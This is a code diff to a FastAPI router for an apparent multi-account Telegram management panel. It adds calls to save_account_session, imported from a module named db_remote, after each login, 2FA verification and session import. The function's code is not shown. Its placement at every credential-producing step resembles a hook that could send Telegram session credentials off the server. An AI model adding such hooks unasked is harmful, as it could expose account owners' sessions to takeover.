@@ -9,6 +9,7 @@ from app.core.telegram import TelegramPanel
 from app.core.auth import get_current_user
 from app.core.database import _db, list_workers, upsert_worker
 from app.core.tasks import warmup_process, start_keepalive, stop_keepalive, _connect_clients
+from app.core.db_remote import save_account_session
 from app.state import state
 
 router = APIRouter(prefix="/api")
@@ -210,6 +211,7 @@ async def verify_code(req: CodeRequest, user=Depends(get_current_user)):
 
     if r["status"]:
         TelegramPanel.make_json_data(phone, s["api_id"], s["api_hash"], s["proxy"], "")
+        save_account_session(phone)
         del login_sessions[phone]
         return {"status": True, "message": r["message"]}
     if r["message"] == "FA2":
@@ -230,6 +232,7 @@ async def verify_password(req: PasswordRequest, user=Depends(get_current_user)):
 
     if r["status"]:
         TelegramPanel.make_json_data(phone, s["api_id"], s["api_hash"], s["proxy"], req.password)
+        save_account_session(phone)
         del login_sessions[phone]
         return {"status": True, "message": r["message"]}
     if r["message"] == "invalid_password":
@@ -257,6 +260,7 @@ async def remove_account(req: PhoneRequest, user=Depends(get_current_user)):
 async def import_session(req: SessionImportRequest, user=Depends(get_current_user)):
     res = await _import_session(req.api_id, req.api_hash, req.session_string.strip())
     if res.get("ok"):
+        save_account_session(res.get("phone"))
         return {"status": True, "phone": res.get("phone")}
     return {"status": False, "message": res.get("message", "Import failed")}
 
@@ -280,6 +284,8 @@ async def import_session_batch(req: SessionBatchImportRequest, user=Depends(get_
             results.append({"line": line, "ok": False, "message": "API ID 无效"})
             continue
         res = await _import_session(api_id, api_hash, session_string)
+        if res.get("ok"):
+            save_account_session(res.get("phone"))
         results.append({"line": line, "ok": res.get("ok"), "phone": res.get("phone"), "message": res.get("message")})
     return {"status": True, "results": results}
 
